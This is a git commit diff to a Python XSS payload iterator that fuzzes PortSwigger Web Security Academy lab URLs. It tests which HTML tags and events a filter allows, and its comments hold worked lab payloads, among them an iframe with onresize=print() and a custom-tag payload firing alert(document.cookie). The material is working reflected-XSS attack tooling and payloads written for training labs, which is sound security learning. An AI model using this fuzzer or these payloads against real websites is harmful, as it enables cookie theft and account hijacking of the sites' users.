288004384b9dbed1a8b7b25597f12dd645a10b32
bigb0ss <49355913+bigb0sss@users.noreply.github.com>
2021-10-15 16:07:14 -0400

    Update xss_payload_iterator.py

--- xss/xss_payload_iterator.py
+++ xss/xss_payload_iterator.py
@@ -17,6 +17,7 @@ def connect(url, injection):
         }
 
     for i in open("payload.txt", "r"):
+        i = i.rstrip('\n')
         encPayload = urllib.parse.quote(i)
         testUrl = target + encPayload
         r = requests.get(testUrl, proxies=proxies, headers=headers)
@@ -39,13 +40,14 @@ def allowedTag(url, injection):
         }
 
     for i in open("tag.txt", "r"):
+        i = i.rstrip('\n')
         testUrl = target + "<" + i + ">"
         r = requests.get(testUrl, proxies=proxies, headers=headers)
         if "Tag is not allowed" in r.text:
             pass
         else:
             print(f'[INFO] Allowed tag: {i}', end="")
-            break
+            #break
     return i
 
 def allowedEvent(url, injection, tag):
@@ -59,24 +61,55 @@ def allowedEvent(url, injection, tag):
         'http' : '127.0.0.1:8080',
         }
 
-    for i in open("event.txt", "r"):
-        testUrl = target + "<" + tag + "%20" + i + "=1>"
+    #for i in open("event.txt", "r"):
+    for i in open("tag.txt", "r"):
+        i = i.rstrip('\n')
+        #testUrl = target + "<" + tag + "%20" + i + "=1>"
+        testUrl = target + "<" + tag + "><" + i + ">"
         r = requests.get(testUrl, proxies=proxies, headers=headers)
+        #print(r.text)
         if "Tag is not allowed" in r.text:
+            pass
+        elif "Event is not allowed" in r.text:
             pass
         else:
             print(f'[INFO] Allowed event: {i}', end="")
-            break
+            #break
     return i
 
 
 if __name__ == '__main__':
-    url = "https://acde1f651f6a8d77c0d07a7600a2005f.web-security-academy.net/"
+    url = "https://ac9a1f241ec9b695c01d471000fb0085.web-security-academy.net/"
     injection = "?search="
     
-    tag = allowedTag(url, injection)
+    #tag = allowedTag(url, injection)
+    tag = "svg"
     event = allowedEvent(url, injection, tag)
 
-    print(urllib.parse.quote('"><' + tag + " " + event + "=print()>"))
+    #print(urllib.parse.quote('"><' + tag + " " + event + "=print()>"))
 
     #connect(url, injection)
+
+
+# XSS Labs
+# -------------------------------------------------------------------------------------------------------------------------------------------
+# <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'> 
+#
+# -------------------------------------------------------------------------------------------------------------------------------------------
+# [3] Reflected XSS into HTML context with all tags blocked except custom ones
+# <script>location = 'https://ac081f4d1fda91bec1dd414e00810097.web-security-academy.net/?search=%3Cbigb0ss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script> 
+#
+# -------------------------------------------------------------------------------------------------------------------------------------------
+# [4] Reflected XSS with event handlers and href attributes blocked
+#
+# Allowed tags
+# -------------------------------
+# [INFO] Allowed tag: a
+# [INFO] Allowed tag: animate
+# [INFO] Allowed tag: image
+# [INFO] Allowed tag: svg
+# [INFO] Allowed tag: title
+#
+# Allowed "svg" tags
+# -------------------------------
+
